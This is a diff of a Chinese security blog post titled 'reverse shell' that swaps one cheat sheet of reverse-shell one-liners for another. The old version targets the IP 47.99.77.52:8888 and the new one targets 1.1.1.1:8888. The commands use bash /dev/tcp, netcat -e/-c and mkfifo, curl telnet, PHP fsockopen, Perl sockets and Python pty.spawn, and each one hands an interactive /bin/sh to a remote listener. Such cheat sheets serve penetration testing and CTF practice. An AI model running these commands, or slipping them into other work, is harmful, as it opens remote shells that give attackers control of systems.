@@ -23,15 +23,15 @@
   <meta name="author" content="dr0n">
   <meta name="keywords" content="">
   
-    <meta name="description" content="反弹shell的常用命令 python1python -c &amp;#x27;import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;47.99.77.52&quot;,8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(">
+    <meta name="description" content="推荐在本地部署一个reverse-shell-generator，可以很方便的查看命令 以下是几个常用的 bash -i1&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;8888 0&gt;&amp;1  nc12345678# nc -enc 1.1.1.1 8888 -e &#x2F;bin&#x2F;sh# nc -cnc -c &#x2F;bin&#x2F;sh 1.1.1.1 8888# nc mk">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell">
 <meta property="og:url" content="https://www.dr0n.top/posts/2f610211/index.html">
 <meta property="og:site_name" content="Dr0n&#39;s blog">
-<meta property="og:description" content="反弹shell的常用命令 python1python -c &amp;#x27;import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;47.99.77.52&quot;,8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(">
+<meta property="og:description" content="推荐在本地部署一个reverse-shell-generator，可以很方便的查看命令 以下是几个常用的 bash -i1&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;8888 0&gt;&amp;1  nc12345678# nc -enc 1.1.1.1 8888 -e &#x2F;bin&#x2F;sh# nc -cnc -c &#x2F;bin&#x2F;sh 1.1.1.1 8888# nc mk">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-07-15T03:00:00.000Z">
-<meta property="article:modified_time" content="2024-07-15T06:18:57.289Z">
+<meta property="article:modified_time" content="2025-07-29T12:02:19.292Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="总结">
 <meta property="article:tag" content="反弹shell">
@@ -298,7 +298,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          150 字
+          287 字
         
       </span>
     
@@ -309,7 +309,7 @@
         
         
         
-          2 分钟
+          3 分钟
         
       </span>
     
@@ -360,16 +360,20 @@
             
               <div class="markdown-body">
                 
-                <p>反弹shell的常用命令</p>
-<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;47.99.77.52&quot;,8888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
+                <p>推荐在本地部署一个<a target="_blank" rel="noopener" href="https://github.com/0dayCTF/reverse-shell-generator">reverse-shell-generator</a>，可以很方便的查看命令</p>
+<p>以下是几个常用的</p>
+<h2 id="bash-i"><a href="#bash-i" class="headerlink" title="bash -i"></a>bash -i</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/sh -i &gt;&amp; /dev/tcp/1.1.1.1/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">nc -e</span><br>nc 1.1.1.1 8888 -e /bin/sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nc -c</span><br>nc -c /bin/sh 1.1.1.1 8888<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nc <span class="hljs-built_in">mkfifo</span></span><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 1.1.1.1 8888 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
 
 
-<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;47.99.77.52&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">C=&#x27;curl -Ns telnet://1.1.1.1:8888&#x27;; $C &lt;/dev/null 2&gt;&amp;1 | /bin/sh 2&gt;&amp;1 | $C &gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);exec(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br><br>php -r &#x27;$sock=fsockopen(&quot;1.1.1.1&quot;,8888);system(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure>
 
 
-<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight nc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nc">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bi<span class="hljs-symbol">n/sh -i 2</span>&gt;&amp;<span class="hljs-number">1</span>|<span class="hljs-symbol">nc 47</span><span class="hljs-number">.99</span><span class="hljs-number">.77</span><span class="hljs-number">.52</span> <span class="hljs-number">8888</span> &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;<br><br>python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;1.1.1.1&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;<br><br>python3 -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;1.1.1.1&quot;,8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#x27;<br></code></pre></td></tr></table></figure>
 
-<h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/bin/sh -i &gt;&amp; /dev/tcp/47.99.77.52/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -435,7 +439,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年7月15日</div>
+          <div>2025年7月29日</div>
         </div>
       
       
